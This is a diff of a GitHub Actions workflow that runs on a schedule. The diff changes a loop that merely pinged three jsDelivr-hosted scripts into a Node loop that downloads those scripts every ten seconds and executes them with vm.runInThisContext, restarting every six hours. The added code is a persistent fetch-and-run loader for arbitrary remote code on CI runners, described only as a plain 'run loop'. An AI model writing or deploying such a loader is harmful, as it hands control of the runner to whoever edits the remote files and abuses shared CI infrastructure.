@@ -1,9 +1,9 @@
-name: js-ping
+name: run-js-loop
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"   # 6時間ごとに自動再起動
+    - cron: "0 */6 * * *"   # 6時間ごと再起動
 
 jobs:
   run:
@@ -11,24 +11,48 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: 10秒ループ
+      - name: run loop
         run: |
-          URLS=(
-            "https://cdn.jsdelivr.net/gh/tsebsiloow/assist@main/JS-assist.js"
-            "https://cdn.jsdelivr.net/gh/tsebsiloow/assist@main/JS-static.js"
-            "https://cdn.jsdelivr.net/gh/tsebsiloow/assist@main/backend-assist.js"
-          )
-
           echo "start"
 
           while true
           do
-            echo "ping $(date)"
+            echo "loop $(date)"
 
-            for u in "${URLS[@]}"
-            do
-              curl -s "$u?t=$(date +%s)" > /dev/null
-            done
+            node <<'EOF'
+            const https = require("https");
+            const vm = require("vm");
+
+            const urls = [
+              "https://cdn.jsdelivr.net/gh/tsebsiloow/assist@main/JS-assist.js",
+              "https://cdn.jsdelivr.net/gh/tsebsiloow/assist@main/JS-static.js",
+              "https://cdn.jsdelivr.net/gh/tsebsiloow/assist@main/backend-assist.js"
+            ];
+
+            function run(url){
+              return new Promise(res=>{
+                https.get(url + "?t=" + Date.now(), r=>{
+                  let data="";
+                  r.on("data",c=>data+=c);
+                  r.on("end",()=>{
+                    try{
+                      vm.runInThisContext(data);
+                      console.log("executed:",url);
+                    }catch(e){
+                      console.log("error:",url);
+                    }
+                    res();
+                  });
+                }).on("error",()=>res());
+              });
+            }
+
+            (async()=>{
+              for(const u of urls){
+                await run(u);
+              }
+            })();
+            EOF
 
             sleep 10
           done
